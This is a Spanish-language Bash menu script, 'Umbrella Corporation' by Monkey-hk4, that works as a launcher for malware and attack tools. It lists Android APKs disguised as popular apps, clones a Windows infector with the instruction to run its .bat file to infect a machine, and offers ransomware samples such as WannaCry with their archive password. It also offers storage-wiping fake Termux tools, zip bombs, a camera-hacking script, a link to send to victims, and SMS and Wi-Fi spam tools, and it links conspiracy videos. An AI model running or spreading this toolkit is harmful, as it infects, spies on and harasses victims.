#!/bin/bash
#
#Created by: Monkey-hk4
#
# 
clear

function logo {
echo -e "
\e[1;32m                   UMBRELLA                             
\e[1;37m            ..,\e[1;31mdxxxxxxxxxxxxxd\e[1;37m;..
\e[1;37m          :.'..\e[1;31mdWMMWWWWWWWMMWx\e[1;37m..'.;
\e[1;37m         '.','.'\e[1;31mkWMMMMMMMMMWk\e[1;37m'.,,'.'
\e[1;37m       ,.',,,''.,\e[1;31m0MMMMWMMMM0\e[1;37m,.,',','.,             EL QUE USA ESTA HERRAMIENTA 
\e[1;37m     '.',,,',','.:\e[1;31mKWMMMMMMK\e[1;37m:.',,'',,''.,           LA USARÀ BAJO SU RESPONSABILIDAD
\e[1;37m  ,..',,''',,'','.\e[1;31mcXMMMMMXc\e[1;37m.',,,',,,,,''..,        MONKEY-HK4 NO SE HACE RESPONSABLE
\e[1;37m .:,...',,'''',,,..\e[1;31moNMMMNo\e[1;37m..',,,,,,,,''..,:.       POR SU MAL USO....
\e[1;31m ;0Kkdc\e[1;37m;,..'',,,,'..\e[1;31mxWMWx\e[1;37m'.,,,,,'...,:\e[1;31mldOX0;
\e[1;31m ,dMMMMNKkdc\e[1;37m;'..'',.'\e[1;31mkNk\e[1;37m'.,''..';\e[1;31mcdkKNMMMMd,
\e[1;31m ;lWMMMMWMMWN0koc\e[1;37m;'...;...';\e[1;31mcok0NMMMMMMMMWc;       ┬ ┬┌┬┐┌┐ ┬─┐┌─┐┬  ┬  ┌─┐ 
\e[1;31m :cNMMMMMMMMMWMMWKd\e[1;37m,...;.,\e[1;31mdKWMMMMMMMMMMMMNc:       │ ││││├┴┐├┬┘├┤ │  │  ├─┤
\e[1;31m :cWMMMMMMMMN0koc\e[1;37m;'...;...';\e[1;31mcokKNMMMMMMMMWl:       └─┘┴ ┴└─┘┴└─└─┘┴─┘┴─┘┴ ┴ 
\e[1;31m ;dWWMMWKkoc\e[1;37m;'..'''.'\e[1;31mkNk\e[1;37m'.,''..';\e[1;31mcdkKNMMMWd;          CORPORATION  
\e[1;31m :0KOdl\e[1;37m:,..'',,,,,..\e[1;31mdWWWx\e[1;37m..,,',,''..';\e[1;31mcdkK0:      
\e[1;31m \e[1;37m.;,...',,,''',,,..\e[1;31moNMMMNo\e[1;37m.',,,,,,,,,'...,:.\e[1;31m
\e[1;37m   '.','',,,,',,'.\e[1;31mcXWMMMMXc\e[1;37m.',,,,,,'',,'.';        WHOEVER USES THIS TOOL
\e[1;37m     ;..',,,,,,'.:\e[1;31mKMMMMMMMK\e[1;37m:.',,,,,,,'';           WILL USE IT UNDER THEIR RESPONSIBILITY
\e[1;37m       ;.',,,,'.,\e[1;31m0MMMMMMMMM0\e[1;37m,.',',,'.;             MONKEY-HK4 IS NOT RESPONSIBLE
\e[1;37m         '.','.'\e[1;31mkWMMMMMMMMMWk\e[1;37m'.,,'.'               FOR ITS MISUSE ....
\e[1;37m          :.'..\e[1;31mdWMMWWWWWWWMMWx\e[1;37m..'.:
\e[1;37m            ..,\e[1;31mdxxxkkkkkxkxxdd\e[1;37m;..
\e[1;32m                 CORPORATION     
 
         MONKEY-HK4 PROYECT UMBRELLA
		 
"


echo -e -n "
  \e[1;31mUSERNAME \e[1;37m: "
read -r user
echo ""
echo -e " \e[7;32m ACCESS GRANTED \e[0m"
echo ""
function ProgressBar {

	let _progress=(${1}*100/${2}*100)/100
	let _done=(${_progress}*4)/10
	let _left=40-$_done
	#carga bar >> 100%
	_done=$(printf "%${_done}s")
	_left=$(printf "%${_left}s")

printf " \r \e[91m║\e[0m\e[1;34m${_done// /█}${_left// / }\e[91m║\e[0m (${_progress}%%) " ""
}

_start=1 
_end=100

for number in $(seq ${_start} ${_end})

do
	sleep 0.1
	ProgressBar ${number} ${_end}
done
clear
}
logo    
echo ""
echo -e "   

\e[1;37m                        .,,aadd88P=8=Y88bbaa,,.
\e[1;37m                  .,ad88888P\e[1;31m:a8P\e[1;37m:d888b\e[1;31m:Y8a\e[1;37m:Y88888ba,.
\e[1;37m              ,ad888888P\e[1;31m:a8888\e[1;37m:a8888888a\e[1;31m:8888a\e[1;37m:Y888888ba,
\e[1;37m           ,a8888888\e[1;31m:d8888888\e[1;37m:d888888888b\e[1;31m:8888888b\e[1;37m:8888888a,
\e[1;37m        ,a88888888\e[1;31m:d88888888\e[1;37m:d88888888888b\e[1;31m:88888888b\e[1;37m:88888888a,
\e[1;37m      ,d88888888\e[1;31m:d888888888\e[1;37m:d8888888888888b\e[1;31m:888888888b\e[1;37m:88888888b,
\e[1;37m    ,d88888888\e[1;31m:d8888888888I\e[1;37m:888888888888888\e[1;31m:I8888888888b\e[1;37m:88888888b,
\e[1;37m  ,d888888888\e[1;31m:d88888888888\e[1;37m:88888888888888888\e[1;31m:88888888888b\e[1;37m:888888888b,
\e[1;37m d8888888888\e[1;31m:I888888888888\e[1;37m:88888888888888888\e[1;31m:888888888888I\e[1;37m:8888888888b

                         WELCOMOME AGENT $user

                         UMBRELLA CORPORATION 
						 

\e[1;31m        1) \e[1;37mVirus APK                 \e[1;31m8) \e[1;37mvideos confidenciales
	
\e[1;31m	2) \e[1;37mVirus Windows EvilCat     \e[1;31m9) \e[1;37mDeep Web Links
	
\e[1;31m	3) \e[1;37mVirus Potentes            \e[1;31m10) \e[1;37mSuper Virus Letales
	
\e[1;31m	4) \e[1;37mTools falsas para termux  \e[1;31m11) \e[1;37mWifi Spam
	
\e[1;31m	5) \e[1;37mZIP BOMBA                 \e[1;31m12) \e[1;37mSMS SPAM
	
\e[1;31m	6) \e[1;37mCamara Hack               \e[1;31m13) \e[1;37mMHK4          
	
\e[1;31m	7) \e[1;37mVirus APK enlace          \e[1;31m14) \e[1;37mSalir       

"
echo -ne "  UMBRELLA > " ; read option


case "$option" in
1)
clear
echo -e "                                                   
\e[1;31m _____ _____ _____ _____ _____    _____ _____ _____ 
\e[1;31m|  |  |     | __  |  |  |   __|  |  _  |  _  |  |  |
\e[1;37m|  |  |-   -|    -|  |  |__   |  |     |   __|    -|
\e[1;37m \___/|_____|__|__|_____|_____|  |__|__|__|  |__|__|
                                                    
"
echo -e "
Los virus son para celulares android, una vez instalados no hay marcha atras. 
nivel de letalidad 8/10

  1 - CONTADOR DE WHATSAPP
  2 - GOOGLE HACK DE DIAMANTES
  3 - HACK CODE 
  4 - IMAGENES FONDOS
  5 - IMAGENES XXX 
  6 - INTERNET GRATIS
  8 - INTERNET
  9 - VIDEOS XXX APP
  10 - WHATSAPP INMUNE
  11 - WHATSAPP PLUS
  12 - WHATSAPP
  13 - YOUTUBE SIN ANUNCIOS

"
echo -e "Las APK se encuentran en la carpteta /UmbrellaCorporation/APK/"
cd APK
ls
;;

2)
echo -e "
\e[1;31m
   ██████╗  █████╗ ████████╗
   ██╔══██╗██╔══██╗╚══██╔══╝
   ██████╔╝███████║   ██║   
   ██╔══██╗██╔══██║   ██║   
██╗██████╔╝██║  ██║   ██║   
╚═╝╚═════╝ ╚═╝  ╚═╝   ╚═╝   

herramienta creada por Wrrulos 
Evilcat
"
sleep 2
git clone https://github.com/wrrulos/EvilCat
cd EvilCat
clear
echo -e "EJECUTAR EL ARCHIVO .bat PARA INFECTAR LA MAQUINA WINDOWS"
ls                            

;;

3)
echo -e "\e[1;32m

╦╔╗╔╔═╗╔═╗╔═╗╔╦╗╔═╗╔╦╗
║║║║╠╣ ║╣ ║   ║ ║╣  ║║
╩╝╚╝╚  ╚═╝╚═╝ ╩ ╚═╝═╩╝

"
sleep 3
echo -e "\e[36m
RANSOMWARES PARA WINDOWS... NO EJECUTARLOS EN TU MÁQUINA PRINCIPAL
\e[1;37m
 1  - RANSOMWARE CRYPTOWALL 
 2  - RANSOMWARE JIGSAW
 3  - RANSOMWARE MAMBA
 4  - RANSOMWARE CERBER
 5  - RANSOMWARE REX
 6  - RANSOMWARE MATSNU
 7  - RANSOMWARE SATANA
 8  - RANSOMWARE VIPASANA
 9  - RANSOMWARE WANNACRY
 10 - RANSOMWARE TESLA
 11 - RANSOMWARE PETRWRAP
 
 Los Virus se encuentran en la carpeta /UmbrellaCorporation/VIRUS/
 
\e[1;32m CONTRASEÑAS: infected"
sleep 5
cd VIRUS
ls
sleep 3

;;
4)
clear
echo -e "
░░░░░░░░░░░███████░░░░░░░░░░░
░░░░░░░████░░░░░░░████░░░░░░░
░░░░░██░░░░░░░░░░░░░░░██░░░░░
░░░██░░░░░░░░░░░░░░░░░░░██░░░
░░█░░░░░░░░░░░░░░░░░░░░░░░█░░
░█░░████░░░░░░░░██████░░░░░█░
█░░█░░░██░░░░░░█░░░░███░░░░░█
█░█░░░░░░█░░░░░█░░░░░░░█░░░░█
█░█████████░░░░█████████░░░░█
█░░░░░░░░░░░░░░░░░░░░░░░░░░░█
█░░░░░░░░░░░░░░░░░░░░░░░░░░░█
█░░░████████████████████░░░░█
░█░░░█▓▓▓▓▓▓▓▓█████▓▓▓█░░░░█░
░█░░░░█▓▓▓▓▓██░░░░██▓██░░░░█░
░░█░░░░██▓▓█░░░░░░░▒██░░░░█░░
░░░██░░░░██░░░░░░▒██░░░░██░░░
░░░░░██░░░░███████░░░░██░░░░░
░░░░░░░███░░░░░░░░░███░░░░░░░
░░░░░░░░░░█████████░░░░░░░░░░

Solo Para Termux

Script de supuesto hackeo a redes sociales
mientras hace proscesos automaticos que borran
tu almacenamiento interno, crean carpetas con nombres
random y descomprimem archivos .zip

"
cd tool_virus
ls
;;

5)
clear
echo -e "\e[36m
       _                
 _  o |_)    _| _  _  _|
 /_ | |   o (_|(/_(_|(_|

 Simples archivos zip comprimidos 
 y que pueden llenar toda la memoria
 de la comptadora ....
 
 no descomprimirlos zip. boom
 
 
"
cd zip_bomb
ls

;;
6)
cd cam-hack
bash saycheese.sh
echo -e " Las fotos tomadas estan en /UmbrellaCorporation/cam-hack/"
;;
7)
echo ""
clear
echo -e "-----------------------"
echo -e "https://bit.ly/3ild93L"
echo -e "_______________________"
echo ""
echo -e "Enviar El link a la víctima a atacar - solo funciona en celulares"
;;
8)
clear
echo -e "\e[1;33m

██╗    ██╗ █████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗ 
██║    ██║██╔══██╗██╔══██╗████╗  ██║██║████╗  ██║██╔════╝ 
██║ █╗ ██║███████║██████╔╝██╔██╗ ██║██║██╔██╗ ██║██║  ███╗
██║███╗██║██╔══██║██╔══██╗██║╚██╗██║██║██║╚██╗██║██║   ██║
╚███╔███╔╝██║  ██║██║  ██║██║ ╚████║██║██║ ╚████║╚██████╔╝
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 
\e[1;37m       
Los siguientes archivos fueron conseguidos desde la deep web.
Tener cuidado y no creer en todo lo que se ve.


The following files were obtained from the deep web
be careful not to believe everything you see.	   
"
sleep 5
clear
echo -e "\e[32m
 ▄▄·        ▐ ▄ ·▄▄▄▪  ·▄▄▄▄  ▄▄▄ . ▐ ▄ ▄▄▄▄▄▪   ▄▄▄· ▄▄▌  
▐█ ▌▪▪     •█▌▐█▐▄▄·██ ██▪ ██ ▀▄.▀·•█▌▐█•██  ██ ▐█ ▀█ ██•  
██ ▄▄ ▄█▀▄ ▐█▐▐▌██▪ ▐█·▐█· ▐█▌▐▀▀▪▄▐█▐▐▌ ▐█.▪▐█·▄█▀▀█ ██▪  
▐███▌▐█▌.▐▌██▐█▌██▌.▐█▌██. ██ ▐█▄▄▌██▐█▌ ▐█▌·▐█▌▐█ ▪▐▌▐█▌▐▌
·▀▀▀  ▀█▄▀▪▀▀ █▪▀▀▀ ▀▀▀▀▀▀▀▀•  ▀▀▀ ▀▀ █▪ ▀▀▀ ▀▀▀ ▀  ▀ .▀▀▀ 

\e[1;31m                UMBRELLA CORPORATION

"
echo -e "
1 - Area 51 UFO 
https://drive.google.com/file/d/1O8Ny48rBk6tmhO6jg06eVU02uoVWdsOh/view?usp=sharing"
sleep 1
echo -e "
2 - Militar Japon 
https://drive.google.com/file/d/1APbL_-WdkWDp67awldUPKDLYYTD9Icb_/view?usp=sharing"
sleep 1
echo -e "
3 - The Plandemic Video
https://drive.google.com/file/d/12OVz0rWGlPNYThV9OqoU-UqsAPUgifpL/view?usp=sharing"
sleep 1
echo -e "
4 - militar dogs
https://drive.google.com/file/d/1clUF8u1L4QYkz_iPqezNEVY09BAHNtWP/view?usp=sharing"
sleep 1
echo -e "
5 - Ufo Book
https://drive.google.com/file/d/1CUR9qOkoaPKkb4zLurz8omuFVMQLBiX-/view?usp=sharing"
sleep 1

;;
9)
clear
echo -e "\e[1;37m"
cat linktor.txt


;;
10)
clear
echo -e "\e[1;31m
▓█████▄ ▓█████ ▄▄▄      ▓█████▄     ██▓███   ▄████▄  
▒██▀ ██▌▓█   ▀▒████▄    ▒██▀ ██▌   ▓██░  ██▒▒██▀ ▀█  
░██   █▌▒███  ▒██  ▀█▄  ░██   █▌   ▓██░ ██▓▒▒▓█    ▄ 
░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌   ▒██▄█▓▒ ▒▒▓▓▄ ▄██▒
░▒████▓ ░▒████▒▓█   ▓██▒░▒████▓    ▒██▒ ░  ░▒ ▓███▀ ░
 ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒    ▒▓▒░ ░  ░░ ░▒ ▒  ░
 ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒    ░▒ ░       ░  ▒   
 ░ ░  ░    ░    ░   ▒    ░ ░  ░    ░░       ░        
   ░       ░  ░     ░  ░   ░                ░ ░      
 ░                       ░                  ░        

Lugar de los virus : UmbrellaCorporation/Dead_pc/
contraseña para algunos zip : mysubsarethebest
"
cd Dead_pc
cd trojans
ls
cd ..
cd jokes
ls
cd .. 
cd rogues
ls
cd ..
cd .. 
;;

11)
clear
echo -e "Instalando wifi-spam..."
cd WiFi-Spam
bash install.sh
bash WiFiSpam.sh
;;

12)

git clone https://github.com/Monkey-hk4/CelBoom
cd CelBoom
chmod +x *
pip install -r requirements.txt
bash CelBoom.sh

;;

13)
clear
echo -e "\e[1;37m
========================================================

Servidor Discord : https://discord.gg/Gj3Y6zf6Wx
Instagram : https://www.instagram.com/monkey_hk4/

Proyecto Umbrella Corporation 09/03/21
Proyecto en el cual se basa de diferentes tipos
de virus los cuales pueden ser letales.

Monkey-hk4 / Mhk4 
no se hace responsable por su mal uso y por los daños
que esta herramienta pueda causar.

========================================================


"
;;
14)
;;
esac
	  
